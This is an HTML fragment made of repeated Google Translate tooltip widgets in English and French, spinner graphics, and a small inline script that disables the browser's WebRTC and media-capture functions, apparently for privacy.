	<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>